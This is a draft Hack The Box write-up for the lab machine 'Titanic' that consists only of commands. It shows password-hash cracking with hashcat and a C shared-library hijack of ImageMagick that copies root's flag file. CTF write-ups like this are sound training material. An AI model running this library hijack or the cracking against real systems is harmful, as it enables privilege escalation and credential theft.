---
title: "HTB Lab | Linux - Titanic"
date: 2025-06-25T23:15:00+07:00
draft: true
tags: ["Linux", "HTB", "HTB Machines", "Web", "Hashcat", "Local File Inclusion", "ImageMagick"]
categories: ["CTF Writeups"]
summary: "How I solved Hack The Box's vulnerable machine \"Titanic\"."
---
[![htb-titanic-1.png](htb-titanic-1.png)](https://app.hackthebox.com/machines/648)

```sh
echo -n "2d149e5fbd1b20cf31db3e3c6a28fc9b" | xxd -r -p | base64
```

```sh
hashcat -m 10900 hashes.txt /usr/share/wordlists/rockyou.txt 
```

```sh
cd /opt/app/static/assets/images
truncate -s 0 metadata.log
find /opt/app/static/assets/images/ -type f -name "*.jpg" | xargs /usr/bin/magick identify >> metadata.log
```

```sh
gcc -x c -shared -fPIC -o ./libxcb.so.1 - << EOF
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

__attribute__((constructor)) void init(){
	system("cp /root/root.txt root.txt; chmod 777 root.txt");
    exit(0);
}
EOF
```

# Learned Skills

